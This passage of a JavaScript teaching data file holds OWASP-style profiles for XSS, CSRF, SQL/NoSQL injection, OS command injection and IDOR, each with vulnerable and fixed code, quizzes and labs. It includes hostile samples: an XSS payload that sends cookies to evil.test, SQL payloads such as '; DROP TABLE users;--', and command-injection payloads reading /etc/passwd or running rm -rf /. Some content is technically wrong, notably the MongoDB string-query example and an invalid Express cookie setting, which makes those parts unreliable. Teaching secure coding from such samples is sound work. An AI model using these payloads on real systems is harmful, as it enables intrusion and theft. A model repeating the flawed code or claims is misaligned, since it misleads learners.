/**
 * ============================================================
 * FILE: src/data/profiles/attack-family.js
 * PURPOSE: "Concept profiles" for the classic injection / client-side
 *          attack families.
 *
 * TEACHING NOTE - WHAT IS A CONCEPT PROFILE?
 *   The 80 OWASP entries (8 years x 10) repeat the same handful of
 *   underlying ideas. "Unvalidated Parameters" (2003) and
 *   "Unvalidated Input" (2004) are the same idea with a better name.
 *   "Insecure Storage" (2004) and "Insecure Cryptographic Storage"
 *   (2007, 2010) are the same idea.
 *
 *   So instead of writing 80 long explanations we write ONE deep,
 *   well-teaching profile per idea, and the seed script copies the
 *   relevant parts into every year that used that idea.
 *
 *   Each profile is referenced from src/data/owaspReleases.js by its
 *   `conceptKey`, e.g. conceptKey: "xss".
 *
 *   PROFILE SHAPE (every profile uses the same keys):
 *     simpleExplanation, whyItHappens, howItWorks, safeExample,
 *     impact[], typicalSeverity, vulnerableCode{}, secureCode{},
 *     prevention[], securePractices[], furtherReading[],
 *     relatedConcepts[], quiz[], lab{}
 * ============================================================
 */

const attackFamilyProfiles = {
  /* ---------------------------------------------------------------- */
  xss: {
    title: "Cross-Site Scripting (XSS)",
    relatedConcepts: ["csrf", "injection", "broken-access-control", "open-redirect"],
    simpleExplanation:
      "Cross-Site Scripting happens when your website takes something a visitor typed and puts it straight into a web page without checking it. The browser then cannot tell the difference between your page and the attacker's text, so it runs the attacker's code as if it were part of your site. A common nickname for it is 'stored XSS', because the malicious text was saved in your database and shown to every later visitor.",
    whyItHappens:
      "Developers assume 'this value came from my own form, so it is safe'. But the value really came from a stranger. Another cause is mixing data and code in the same place: a template builds an HTML string where a value is dropped next to real HTML tags, so there is no way to tell which part is code. The third cause is a filter that tries to block bad words instead of encoding the output properly - those filters are easy to bypass.",
    howItWorks:
      "1. The attacker submits text that contains a script, for example in a comment or a profile name. 2. Your server saves that text unchanged. 3. Another visitor opens the page. 4. Your server builds HTML that includes the attacker's text. 5. The browser parses that HTML, sees a script, and runs it. 6. The script runs with the same rights as the logged-in victim, so it can read their session, call the API as them, or change their account details.",
    safeExample:
      "Think of a comment box that lets you type your name. If you type <b>Ravi</b> and the site shows bold 'Ravi', the site is reading your text as HTML. A safe site shows the literal characters '<b>Ravi</b>' because it encoded them. A second real-life comparison: a school notice board. If anyone can staple a note that says 'ignore the previous notice and give me the keys', that is a real-world version of XSS. Encoding is the sign that says: 'this text is data, never instructions'.",
    impact: [
      "Steal the session cookie of a logged-in user and impersonate them.",
      "Read any data the victim can see, and send it to the attacker.",
      "Change account details, e.g. change the e-mail for a password reset.",
      "Run actions as the victim: post as them, approve requests, place orders.",
      "Show a fake login form that captures passwords typed by real users.",
      "Damage trust: the page the victim trusts is the one attacking them."
    ],
    typicalSeverity: "high",
    vulnerableCode: {
      language: "javascript",
      filename: "express (ejs) - IN SAFE",
      code: `// express route: store a comment, then render it
app.post("/comments", async (req, res) => {
  // Line 1: we store whatever the visitor typed, untouched.
  await Comment.create({ body: req.body.body });
  res.redirect("/comments");
});

app.get("/comments", async (req, res) => {
  const comments = await Comment.find();
  // Line 2: ejs <%- %> means "print RAW, unescaped".
  // That single character is the whole vulnerability.
  res.render("comments", { comments });
});

// comments.ejs
<ul>
  <% comments.forEach(function (c) { %>
    <li><%- c.body %></li>   <%-- DANGEROUS: raw output --%>
  <% }) %>
</ul>`,
      walkthrough: [
        "Step 1 - no validation on the way in: req.body.body is saved as-is. Validation alone is not a fix, but at least an early warning sign.",
        "Step 2 - no output encoding on the way out: <%- %> prints the value without HTML-escaping.",
        "Step 3 - that is the whole bug. A comment such as <img src=x onerror=\"fetch('//evil.test/?c='+document.cookie)\"> is stored like any normal comment.",
        "Step 4 - every later visitor renders it, the browser runs the onerror handler, and the attacker's server receives the cookie."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express (ejs) - SAFE",
      code: `const express = require("express");
const rateLimit = require("express-rate-limit");
const commentHtml = require("sanitize-html");
app.use(express.json());

// 1) Content-Security-Policy is the second line of defence.
//    It is set in src/app.js with helmet; repeated here for clarity.
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'");
  next();
});

// 2) Store the text, and tell the browser not to sniff content types.
app.post("/comments", rateLimit({ windowMs: 60000, limit: 5 }), async (req, res) => {
  const body = String(req.body.body || "").slice(0, 2000);
  // Encoding for STORAGE is one option, but the safer classic approach
  // is to store raw text and encode on OUTPUT. We do both: keep length
  // limits and normalise whitespace.
  await Comment.create({ body: body.replace(/[\\u0000-\\u001F]/g, " ") });
  res.redirect("/comments");
});

app.get("/comments", async (req, res) => {
  const comments = await Comment.find().sort({ _id: -1 }).limit(50);
  // 3) Send the data as JSON, not as an HTML string. The browser
  //    treats JSON as data, so it can never become a script.
  res.json({ comments });
});

// 4) On the React side, render text - never dangerouslySetInnerHTML.
function CommentList({ comments }) {
  return <ul>{comments.map(c => <li key={c._id}>{c.body}</li>)}</ul>;
  // {c.body} escapes automatically. {<div dangerouslySetInnerHTML/>}
  // would put the XSS hole straight back.
}`,
      explanation:
        "Three layers, any one of which would have stopped the attack: (1) output encoding, which is the real fix; (2) never injecting raw HTML, so JSON plus React text nodes are safe by default; (3) a strict Content-Security-Policy so inline scripts cannot run even if something slips through. React escapes text for you - that is one of the reasons it is a safer default than building HTML strings by hand."
    },
    prevention: [
      "Encode output for the exact context you are writing into: HTML body, HTML attribute, JavaScript string, URL, or CSS each need different encoding.",
      "Prefer templates that escape by default, and never use a raw/unescaped print tag.",
      "Send data as JSON (via fetch) and let the framework render it, instead of building HTML strings on the server.",
      "Add a strict Content-Security-Policy that forbids inline scripts.",
      "Set HttpOnly and Secure on session cookies so a stolen document.cookie is useless.",
      "Use an allow-list HTML sanitiser if users genuinely need formatting.",
      "Validate input as defence in depth, but never rely on validation alone."
    ],
    securePractices: [
      "Ask: where does this value end up? HTML, an attribute, a script, or a URL? Encode for that context.",
      "Keep data and code apart. The moment you concatenate a value into a script or markup string, you have re-created the bug.",
      "Prefer mature, well-audited sanitiser libraries over hand-written replace() chains.",
      "Add a regression test: store a script payload as a comment and assert it comes back escaped.",
      "Remember that stored XSS hurts every visitor, not only the one who submitted it."
    ],
    furtherReading: [
      "OWASP Cross Site Scripting Prevention Cheat Sheet",
      "OWASP Cheat Sheet Series: Cross Site Scripting Prevention",
      "MDN: Content-Security-Policy header"
    ],
    quiz: [
      {
        question: "A comment is rendered with EJS <%- comment.body %>. What is the risk?",
        options: [
          "None, EJS always escapes output",
          "Stored XSS, because <%- %> prints raw unescaped HTML",
          "Only a performance problem",
          "SQL injection, because the value came from a form"
        ],
        correctIndex: 1,
        explanation:
          "In EJS, <%= %> escapes and <%- %> prints raw. Using <%- %> with user data is the classic stored-XSS mistake."
      },
      {
        question: "Which control is the PRIMARY defence against XSS?",
        options: [
          "A long password policy",
          "Context-aware output encoding",
          "Disabling cookies",
          "Hiding the error page"
        ],
        correctIndex: 1,
        explanation:
          "Encoding the output for its context is what makes the value inert. CSP and HttpOnly cookies are valuable second layers."
      },
      {
        question: "Why is a Content-Security-Policy useful even after you fix the encoding bug?",
        options: [
          "It encrypts the database",
          "It blocks inline scripts, so an escaped-value mistake that slips through has less impact",
          "It makes the page load faster",
          "It replaces the need for input validation"
        ],
        correctIndex: 1,
        explanation:
          "CSP is defence in depth. It cannot stop all XSS, but it stops inline script execution, which is what turns a bug into a session theft."
      }
    ],
    lab: {
      title: "Find the unescaped output in a tiny Express app",
      type: "identify-the-bug",
      task:
        "On paper (or in a local scratch project), compare two render calls: res.render('page', {name}) with <%= name %> versus <%- name %>. Decide which one is exploitable and write down exactly why.",
      steps: [
        "Write down what the browser does when it sees a <script> tag inside page HTML.",
        "Trace the value from req.query.name to the template and note every step it passes through untouched.",
        "Predict the page source after visiting /?name=<script>alert(1)</script> for each variant.",
        "Then write the fix and predict the page source again.",
        "Bonus: add a Content-Security-Policy and explain what it would block."
      ],
      hint: "EJS has two print tags. One escapes, one does not. Find the difference in the docs.",
      solution:
        "<%= %> escapes HTML special characters, so the value is shown as text and can never become a tag. <%- %> prints the value raw, so a script tag in the value becomes a real script tag in the page and executes. The fix is to use <%= %> for all user data, keep a strict CSP, and set HttpOnly on the session cookie so a stolen cookie cannot be replayed.",
      isSafe: true,
      estimatedMinutes: 15
    }
  },

  /* ---------------------------------------------------------------- */
  csrf: {
    title: "Cross-Site Request Forgery (CSRF)",
    relatedConcepts: ["xss", "broken-access-control", "broken-authentication"],
    simpleExplanation:
      "CSRF is a trick that makes a logged-in user's browser send a request the user never intended. The attacker's webpage quietly submits a hidden form to your website. Because the victim is already logged in, the browser attaches their session cookie automatically, and your server thinks the request came from a genuine user.",
    whyItHappens:
      "Browsers attach cookies to requests automatically. If your server decides 'the request is allowed because a valid session cookie arrived', then any other website can cause that cookie to be sent. The missing piece is proof that the request really came from your own page. Older frameworks left this to the developer, so it was forgotten constantly.",
    howItWorks:
      "1. The victim logs into the banking site. The browser stores a session cookie. 2. The victim opens the attacker's page. 3. That page contains a hidden auto-submitting form pointing at https://bank.test/transfer. 4. The browser sends the request and adds the banking cookie, because the cookie is for the right domain. 5. The server only checks 'is there a valid session cookie?' - yes - and completes the transfer.",
    safeExample:
      "It is like a photocopier that automatically stamps the last form you filled in. You walk away from the desk, someone else walks up, and the machine stamps the previous form again with today's date. The machine (your browser) did nothing wrong; the missing control is a secret stamp that only you know - which is exactly what an anti-CSRF token is.",
    impact: [
      "Perform state-changing actions as the victim: money transfers, password changes, address changes.",
      "Change the victim's e-mail address, then request a password reset to take over the account.",
      "Post content, approve users, or delete records in the victim's name.",
      "Works silently: the victim sees nothing unusual because the request happens in the background."
    ],
    typicalSeverity: "high",
    vulnerableCode: {
      language: "javascript",
      filename: "express - NO CSRF PROTECTION",
      code: `// server: trusts the session cookie alone
app.post("/transfer", async (req, res) => {
  const user = await User.findById(req.session.userId);
  // No token check at all. Any site can trigger this.
  await Transfer.create({
    to: req.body.to,
    amount: req.body.amount,
    userId: user._id
  });
  res.json({ ok: true });
});`,
      walkthrough: [
        "Line 1-2: the route trusts req.session.userId. That is correct - but it is not proof of intent.",
        "The check that is MISSING is the anti-CSRF token. Without it, the browser will attach the session cookie to a cross-site POST automatically.",
        "Also missing: SameSite cookies. Even with SameSite=Lax, POST requests from another site would not carry the cookie - but relying on one control alone is fragile."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express + csurf-style double-submit token",
      code: `const crypto = require("crypto");

// 1) Issue a random token per session and expose it to the page.
app.get("/transfer", (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  }
  res.render("transfer", { csrfToken: req.session.csrfToken });
});

// 2) The form must POST the token back.
app.post("/transfer", async (req, res) => {
  // 3) Compare in constant time so the check cannot be timed.
  const sent = String(req.body._csrf || "");
  const expected = req.session.csrfToken || "";
  const ok =
    sent.length === expected.length &&
    crypto.timingSafeEqual(Buffer.from(sent), Buffer.from(expected));

  if (!ok) return res.status(403).json({ error: "Invalid CSRF token" });

  await Transfer.create({
    to: req.body.to,
    amount: Number(req.body.amount),
    userId: req.session.userId
  });
  res.json({ ok: true });
});

// 4) Defence in depth: cookies that browsers do not attach to
//    cross-site POST requests.
app.session.cookie.sameSite = "lax";  // or "strict"
app.session.cookie.httpOnly = true;
app.session.cookie.secure = true;    // HTTPS only`,
      explanation:
        "An anti-CSRF token works because the attacker's page can make the browser SEND the cookie, but it cannot READ the token from your page (that is the same-origin policy). The server therefore sees a token it issued and a token the attacker could not have known. SameSite cookies and HTTPS are the extra layers."
    },
    prevention: [
      "Use a synchroniser token or the double-submit cookie pattern on every state-changing request.",
      "Set the session cookie to SameSite=Lax or Strict, and Secure and HttpOnly.",
      "Do not use GET for state changes; GET requests are easy to trigger from anywhere (an img tag is enough).",
      "Check the Origin or Referer header as an additional signal.",
      "Never disable the token check 'just for testing' and forget to re-enable it - write a test instead."
    ],
    securePractices: [
      "State-changing actions must be POST/PUT/PATCH/DELETE plus a token.",
      "Treat 'the cookie was sent' as 'whoever has this session', not as 'the user typed this'.",
      "Add an automated test that asserts a POST without a token returns 403.",
      "Read the CSRF entry in the OWASP Cheat Sheet when you build any form.",
      "Keep an eye on your dependencies: many frameworks now ship CSRF protection - use it instead of rolling your own."
    ],
    furtherReading: [
      "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
      "OWASP CSRF Testing Guide"
    ],
    quiz: [
      {
        question: "Why does a CSRF attack work even though the attacker cannot read the victim's cookies?",
        options: [
          "The attacker can read cookies through JavaScript",
          "The BROWSER automatically attaches the cookie to the cross-site request, so the server sees a valid session",
          "CSRF only works on HTTP sites",
          "The attacker steals the cookie from the network"
        ],
        correctIndex: 1,
        explanation:
          "The attacker never needs to see the cookie. They only need the browser to send it, and browsers do that automatically for cookies that match the target domain."
      },
      {
        question: "Which cookie attribute most directly reduces CSRF risk?",
        options: ["HttpOnly", "SameSite", "Expires", "Domain"],
        correctIndex: 1,
        explanation:
          "SameSite tells the browser not to attach the cookie to requests coming from another site. HttpOnly protects against XSS stealing the cookie, not against CSRF."
      },
      {
        question: "What must an anti-CSRF token do that a session cookie cannot?",
        options: [
          "Be stored in the database",
          "Be known to your page but unreadable by an attacker's page (thanks to the same-origin policy)",
          "Change on every request",
          "Be a JWT"
        ],
        correctIndex: 1,
        explanation:
          "The token is embedded in your page for your scripts to read, and the attacker's page cannot read it because of the same-origin policy."
      }
    ],
    lab: {
      title: "Spot the missing CSRF control",
      type: "spot-the-change",
      task:
        "You are given three route handlers: one with no protection, one with a token check, one with SameSite cookies only. Decide which CSRF scenarios each one survives.",
      steps: [
        "List the three CSRF variants you can think of: hidden auto-form, img tag GET, and fetch with credentials.",
        "For each route, mark which variants still succeed and why.",
        "Add the missing control to the weakest route and re-test your list."
      ],
      hint: "SameSite blocks the cookie from being sent. A token blocks the request being trusted. Ask what an img tag can and cannot do.",
      solution:
        "No control is perfect alone. A token protects any method and any origin; SameSite protects most cross-site POSTs in modern browsers but historically had bypasses and does not help GET-triggered state changes. HttpOnly is unrelated to CSRF (it stops XSS from reading cookies). The correct answer is token plus SameSite plus never changing state on GET.",
      isSafe: true,
      estimatedMinutes: 15
    }
  },

  /* ---------------------------------------------------------------- */
  injection: {
    title: "Injection",
    relatedConcepts: ["command-injection", "idor", "xss", "vulnerable-components"],
    simpleExplanation:
      "Injection happens when your program builds a command or a database query by pasting user input straight into it. The data the user types is no longer treated as data - it becomes part of the instruction. In a database query this is SQL injection; in a system call it is OS command injection; the same idea applies to LDAP, XPath, NoSQL and template expressions.",
    whyItHappens:
      "String concatenation. A developer writes 'SELECT * FROM users WHERE email = \\'' + email + '\\'' and believes that quoting the value is enough. Quoting breaks the moment the value itself contains a quote. The fix is not 'sanitise the quotes' - the fix is to stop building the query as text and let the driver send the structure and the values separately.",
    howItWorks:
      "1. The user types something like ' OR '1'='1 as an e-mail. 2. Your code pastes it into a SQL string: SELECT * FROM users WHERE email = '' OR '1'='1'. 3. The database reads the whole thing as ONE instruction. The OR clause is now part of the query, not part of a value. 4. The condition is always true, so the query returns every user. 5. If the driver allows stacked queries, the attacker can even run INSERT or DELETE in the same request.",
    safeExample:
      "Compare writing a shopping list by hand versus giving it to a cashier with clear item/quantity boxes. If you handwrite the sentence 'I want 3 apples and also delete the eggs' on the same line, the reader cannot tell where the items end. Separate boxes (placeholders) mean the instruction structure is fixed and your words only fill the blanks. That is parameterised queries.",
    impact: [
      "Read any table in the database, including passwords and personal data.",
      "Modify or delete data, and in some setups create admin accounts.",
      "On badly configured systems, escalate to operating system commands.",
      "Steal or corrupt data silently, with no trace in the application logs.",
      "Long-term: complete loss of the database and every secret it holds."
    ],
    typicalSeverity: "critical",
    vulnerableCode: {
      language: "javascript",
      filename: "mongo query built by hand - IN SAFE",
      code: `// VULNERABLE: the query is a STRING, so input becomes structure
const email = req.query.email;

const users = await User.find(
  { email: { $eq: "' OR '1'='1" } }  // not this - the shape below is the bug
);

// The classic broken version:
const q = "{ email: '" + req.query.email + "' }";
const users = await User.collection.find(q);
// Attacker sends ?email=' OR '1'='1
// Final string sent to MongoDB: { email: '' OR '1'='1' }
// MongoDB reads ' OR '1'='1 as an operator, not as text.`,
      walkthrough: [
        "Line 1: the value comes straight from the query string - fully attacker controlled.",
        "The string build is the bug. Once you build a query as text, the attacker controls the grammar, not just the value.",
        "With MongoDB, a value like $ne: null (NoSQL operator injection) or a nested object can do the same job: find where a password exists.",
        "With SQL, the classic payload is ' OR '1'='1 or '; DROP TABLE users;-- depending on the driver and permissions."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "mongo (mongoose) - SAFE",
      code: `// ================ MongoDB / Mongoose ================
// 1) Pass a real OBJECT, not a string. Mongoose then sends the
//    structure and the value separately - the value can never
//    become part of the query.
const user = await User.findOne({ email: String(req.query.email) });

// 2) Never allow a raw operator through from the request body.
const filters = { role: { $in: ["student", "teacher"] } };   // allow-list
const courses = await Course.find(filters);

// 3) If you must accept a sort key, map names -> real fields.
const SORTABLE = { title: 1, createdAt: -1 };
const sort = SORTABLE[String(req.query.sort)] ?? { createdAt: -1 };
const list = await Course.find({}).sort(sort);

// ================ SQL / Postgres (for comparison) ================
// The same principle, with placeholders:
const { rows } = await pool.query(
  "SELECT id, email FROM users WHERE email = $1 AND role = $2",
  [String(req.query.email), "student"]
);
// NEVER: "SELECT ... WHERE email = '" + email + "'"`,

      explanation:
        "With Mongoose, passing an object such as { email: value } keeps the query structure fixed. With SQL drivers, placeholders such as $1 keep the SQL fixed and send the value in a separate channel. In both cases the attacker's text stays a VALUE, which is the only property you actually need."
    },
    prevention: [
      "Use parameterised queries / prepared statements. Never build a query by string concatenation.",
      "Prefer an ORM or query builder that generates parameterised queries for you.",
      "Validate the SHAPE of input, not just the content: check types, ranges and allowed keys.",
      "Give the database account the minimum permissions it needs - no DROP, no FILE.",
      "Prefer allow-lists for operators, sort keys, column names and file paths.",
      "Escape output for the context you are writing into, and use a proper template engine.",
      "Turn off dangerous driver features such as multiple statements, eval and mapReduce from user input."
    ],
    securePractices: [
      "Rule of thumb: if user input and code are on the same line of source, it is a bug waiting to happen.",
      "Centralise data access in a small query layer so the rule is enforced once.",
      "Log rejected input so injection attempts are visible - but never log passwords or full tokens.",
      "Add a test: send a quote and an OR 1=1 payload, and assert the result set is unchanged.",
      "Remember the second-order case: a value stored safely can still be dangerous when it is later concatenated into a report or a log."
    ],
    furtherReading: [
      "OWASP SQL Injection Prevention Cheat Sheet",
      "OWASP Injection Prevention Cheat Sheet",
      "OWASP Testing Guide - Injection"
    ],
    quiz: [
      {
        question: "Why does escaping quotes NOT fix SQL injection?",
        options: [
          "It does fix it, fully",
          "Because escaping only protects the quote character, while attackers can also change the structure using numbers, keywords, or a backslash trick",
          "Because MySQL does not support escaping",
            "Because parameterised queries are slower"
        ],
        correctIndex: 1,
        explanation:
          "Escaping is fragile across encodings and drivers. Structural separation (parameters) removes the whole class of bug."
      },
      {
        question: "What is the correct fix for injection?",
        options: [
          "Blacklist the words SELECT, DROP and OR",
          "Use parameterised queries so input is always sent as a value",
          "Escape the output with HTML entities",
          "Run the query as an administrator account"
        ],
        correctIndex: 1,
        explanation:
          "Parameterisation is the structural fix. Blacklists are bypassed; HTML escaping solves a different problem; admin accounts make the impact far worse."
      },
      {
        question: "In MongoDB, why is this dangerous? { email: req.body.email } with no type check?",
        options: [
          "Nothing, Mongoose is safe",
          "The attacker can send an OPERATOR object such as { $ne: null } instead of a string",
          "It is slow",
          "It breaks the index"
        ],
        correctIndex: 1,
        explanation:
          "This is NoSQL operator injection. Coerce and allow-list the type - for example String(req.body.email) - so an object can never be injected."
      }
    ],
    lab: {
      title: "Convert a hand-built query into a safe one",
      type: "fix-the-code",
      task:
        "You are given four search endpoints that build queries with + and one that uses placeholders. Rewrite each unsafe one so the input can only ever be a value, then explain in one line what each fix blocks.",
      steps: [
        "Mark every place where user input crosses from data into structure.",
        "For each one, write the fixed version using an object or a placeholder.",
        "Predict what the database would return for the payload ' OR '1'='1 before and after your fix.",
        "Add a unit test that asserts the payload returns zero extra rows."
      ],
      hint: "Ask yourself: is the value travelling as part of the query TEXT, or as a separate value?",
      solution:
        "Replace string-built queries with object/placeholder queries and coerce types (String(...), Number.isInteger checks). Then the payload becomes the harmless literal email \"' OR '1'='1\" which matches no row, so the result set is identical to a normal search for that text. Also run the app's database account with read-only or minimal write permissions, so even a missed spot cannot drop tables.",
      isSafe: true,
      estimatedMinutes: 20
    }
  },

  /* ---------------------------------------------------------------- */
  "command-injection": {
    title: "OS Command Injection",
    relatedConcepts: ["injection", "idor", "xxe", "insecure-design"],
    simpleExplanation:
      "Command injection happens when your server passes user input to the operating system shell as part of a command line. Because the shell understands separators such as ; && | and the backtick, anything the user types can become a second command. The 2003 OWASP list called this 'Command Injection Flaws'; today it is covered under Injection.",
    whyItHappens:
      "Running a shell is almost always unnecessary. Developers use it because it is quick: 'ping -c 1 ' + host, or 'convert ' + file + ' out.png'. The rule is simple: never build a command line out of a string, and avoid the shell entirely by using the API that takes arguments as an array (child_process.execFile, spawn with argument arrays).",
    howItWorks:
      "1. The app has a 'ping this host' feature: exec('ping -c 1 ' + host). 2. The user enters 127.0.0.1; cat /etc/passwd. 3. The shell sees two commands: ping -c 1 127.0.0.1 and cat /etc/passwd. 4. The second command runs with the privileges of the web server - often root inside a container.",
    safeExample:
      "It is like a receptionist who writes your request on a slip of paper and hands it to a colleague, who then does whatever is written. If you can write 'call the bank, and after that, open the safe', the receptionist will do both. The safe version passes arguments as separate labelled fields that cannot be reinterpreted.",
    impact: [
      "Full remote code execution on the server, with the web server's privileges.",
      "Read configuration files, source code, environment variables and cloud credentials.",
      "Install a backdoor, mine cryptocurrency, or pivot to other machines on the network.",
      "Complete compromise of the host, and often of the whole environment."
    ],
    typicalSeverity: "critical",
    vulnerableCode: {
      language: "javascript",
      filename: "node child_process - IN SAFE",
      code: `const { exec } = require("child_process");

// DANGEROUS: exec() runs a SHELL, so ; | && are interpreted.
app.get("/ping", (req, res) => {
  const host = req.query.host;                 // attacker controlled
  exec("ping -c 1 " + host, (err, out) => {     // <-- the vulnerability
    if (err) return res.status(500).send("ping failed");
    res.send(out);
  });
});

// Payload: /ping?host=127.0.0.1;cat%20/etc/passwd
// The shell runs "ping -c 1 127.0.0.1" then "cat /etc/passwd"
// and returns the file contents in the response.`,
      walkthrough: [
        "Line 1: exec() spawns /bin/sh, which understands shell syntax.",
        "Line 3-4: the host value is concatenated, so the attacker chooses the second half of the command.",
        "Missing: an allow-list of valid hostnames. Even with validation, an allow-list is the last line of defence, not the first.",
        "The real fix is to not use a shell at all - see the secure version."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "node child_process - SAFE",
      code: `const { execFile } = require("child_process");
const { promisify } = require("util");
const run = promisify(execFile);

// 1) An ALLOW-LIST of exactly what may be checked.
const ALLOWED_HOSTS = new Set(["localhost", "127.0.0.1", "::1"]);

app.get("/ping", async (req, res) => {
  const host = String(req.query.host || "");

  // 2) Reject everything not on the list. No wildcards, no regex.
  if (!ALLOWED_HOSTS.has(host)) {
    return res.status(400).json({ error: "Host not allowed" });
  }

  try {
    // 3) execFile with an ARGUMENT ARRAY: no shell, so ; | && are
    //    just ordinary characters in one argument.
    const { stdout } = await run("ping", ["-c", "1", host], {
      timeout: 3000,          // stop a hang
      maxBuffer: 1024 * 64    // cap the output
    });
    res.type("text/plain").send(stdout);
  } catch (err) {
    res.status(500).json({ error: "ping failed" });
  }
});

// Same idea for image conversion - note the OUT extension is also
// validated, because "out.png" is part of the file path.
// run("convert", [safeInputPath, "out.png"]);`,
      explanation:
        "execFile/spawn pass arguments to the operating system as a list, so the operating system - not a shell - decides where one argument ends. A value such as 127.0.0.1;rm -rf / stays a single weird filename and simply fails. The allow-list makes sure the command can only ever do something you intended."
    },
    prevention: [
      "Never use exec/execSync with a shell. Use execFile or spawn with an argument array.",
      "If a shell is unavoidable, use strict escaping for every argument - and treat this as a last resort.",
      "Apply an allow-list to every value that reaches a command, including file names and extensions.",
      "Run the application as a low-privilege, non-root user in a container with a read-only filesystem.",
      "Do not interpolate environment variables into command strings.",
      "Set timeouts and output size limits so a command cannot hang or flood the server."
    ],
    securePractices: [
      "If a task can be done in JavaScript, do it in JavaScript and skip the process entirely.",
      "Ask 'does this really need a shell?' If the answer is no, the bug class disappears.",
      "Keep an escape/validation helper in one shared module, reviewed once, instead of copy-pasting it.",
      "Add a test that sends a semicolon payload and asserts nothing extra ran.",
      "Least privilege: a compromised web process should not be able to read /etc/shadow or install anything."
    ],
    furtherReading: [
      "OWASP OS Command Injection Defense Cheat Sheet",
      "OWASP Testing Guide - OS Command Injection",
      "Node.js child_process documentation and its warning about shell injection"
    ],
    quiz: [
      {
        question: "Which Node.js function is the dangerous one, and why?",
        options: [
          "exec, because it runs a shell that interprets ; | && and backticks",
          "execFile, because it takes an array",
          "readFile, because it reads secrets",
          "spawn, because it starts a process"
        ],
        correctIndex: 0,
        explanation:
          "exec builds one command string and hands it to a shell. execFile and spawn pass an argument array directly to the operating system, so shell operators have no meaning."
      },
      {
        question: "You need to run 'convert input.png out.png' safely. What is the key step?",
        options: [
          "Escape the semicolons",
          "Validate BOTH the input path and the output extension with an allow-list, then pass arguments as an array without a shell",
          "Add a try/catch",
          "Run it as root so it always works"
        ],
        correctIndex: 1,
        explanation:
          "The output extension is part of a file path, so it needs validation too. Only an allow-list plus a shell-free call makes the whole thing predictable."
      },
      {
        question: "What is the strongest extra layer if command injection does happen?",
        options: [
          "Hiding the command output from the HTTP response",
          "Running the app as an unprivileged user inside a restricted container",
          "Logging every command",
          "Using longer variable names"
        ],
        correctIndex: 1,
        explanation:
          "You cannot make the injection disappear, but least privilege decides how much damage it can do. A read-only filesystem and no root account turn RCE into a far smaller incident."
      }
    ],
    lab: {
      title: "Rewrite a shell command safely",
      type: "fix-the-code",
      task:
        "Convert a 'ping host' endpoint and a 'convert file' endpoint from exec with concatenation to a shell-free version, and write down which payloads your fix blocks.",
      steps: [
        "List the payloads you can think of: ; id, | whoami, && curl, $(id), backticks, newline.",
        "For each, decide what the shell does with the broken version.",
        "Rewrite using execFile with an argument array and an allow-list.",
        "Re-run your payload list against the new version and note the error you get."
      ],
      hint: "The difference is not escaping - it is whether a shell ever reads your string.",
      solution:
        "execFile/spawn with an array plus an allow-list makes every shell operator a harmless character inside a single argument. Nothing is 'escaped', so there is nothing to escape incorrectly. As a second layer, run unprivileged with a read-only filesystem so a future mistake cannot escalate.",
      isSafe: true,
      estimatedMinutes: 20
    }
  },

  /* ---------------------------------------------------------------- */
  idor: {
    title: "Insecure Direct Object Reference (IDOR)",
    relatedConcepts: ["broken-access-control", "injection", "xss", "open-redirect"],
    simpleExplanation:
      "IDOR happens when your server checks that a user is logged in, but forgets to check WHETHER THAT USER IS ALLOWED TO SEE THIS PARTICULAR PIECE OF DATA. The user changes a number in the address bar - 42 becomes 43 - and the server happily hands over someone else's record. No password is stolen and no code is injected; you simply asked for a different object.",
    whyItHappens:
      "The route only asks 'is there a session?' and then fetches a document by an id from the URL. The developer assumes the id is unguessable. Sequential integers (1, 2, 3) or MongoDB ObjectIds are not secrets - they are public knowledge for anyone who can read the page, and they are trivially enumerable.",
    howItWorks:
      "1. Ravi is logged in and can open /api/invoices/101, which is his own invoice. 2. He changes 101 to 102. 3. The server does User.findById(session.userId) for identity, but then does Invoice.findById(req.params.id) with no ownership check. 4. Invoice 102 belongs to Asha, and the server returns it. 5. Repeating the request downloads every invoice in the system.",
    safeExample:
      "It is like a hospital where the receptionist checks your photo ID at the door, but then lets you walk into any room in the building. The door check is fine; the problem is that nobody checks whether that specific room is yours. Object-level authorisation is the check at the room door.",
    impact: [
      "Read private records of other users: invoices, medical files, exam results, address books.",
      "Modify or delete another user's data if the route allows writes.",
      "Mass data exposure by simply looping through ids.",
      "Regulatory consequences: most data-protection laws treat this as a personal data breach.",
      "Total loss of trust in the application's data isolation."
    ],
    typicalSeverity: "high",
    vulnerableCode: {
      language: "javascript",
      filename: "express route - IN SAFE",
      code: `// The classic IDOR: identity is checked, ownership is not.
app.get("/api/invoices/:id", async (req, res) => {
  const userId = req.session.userId;              // who is asking
  const invoice = await Invoice.findById(req.params.id); // whose data?!

  // The only "check" is a 404 for non-numbers - trivially bypassed
  // with /api/invoices/102.
  res.json(invoice);
});

app.post("/api/invoices/:id/approve", async (req, res) => {
  // Worse: it also ALLOWS a change on someone else's invoice.
  await Invoice.findByIdAndUpdate(req.params.id, { status: "approved" });
  res.json({ ok: true });
});`,
      walkthrough: [
        "Line 3: the object id comes straight from the URL and is never compared to the session user.",
        "Line 4: the response leaks another user's entire document, including fields you did not intend to expose.",
        "The approve route is worse still - it is a write on a foreign object, which turns a read bug into data corruption.",
        "Missing: one ownership predicate in the query itself."
      ]
    },
    secureCode: {
      language: "javascript",
      filename: "express route - SAFE",
      code: `// 1) Put the OWNERSHIP condition INSIDE the query. If the user
//    is wrong, the document simply is not found.
app.get("/api/invoices/:id", async (req, res) => {
  const invoice = await Invoice.findOne({
    _id: req.params.id,
    userId: req.session.userId          // <-- the fix
  });

  // 2) 404, not 403: do not confirm that the other record exists.
  if (!invoice) return res.status(404).json({ error: "Invoice not found" });

  res.json(invoice);
});

// 3) Role-based check for the rare case where staff really may read
//    another user's invoice - and the role comes from the SESSION,
//    never from the request.
app.get("/api/invoices/:id/support", async (req, res) => {
  if (!["support", "admin"].includes(req.session.user.role)) {
    return res.status(403).json({ error: "Not allowed" });
  }
  const invoice = await Invoice.findById(req.params.id).lean();
  res.json(invoice);
});

// 4) Do not send unnecessary fields back.
function toPublicInvoice(doc) {
  return { id: doc._id, total: doc.total, status: doc.status, issuedAt: doc.issuedAt };
}`,
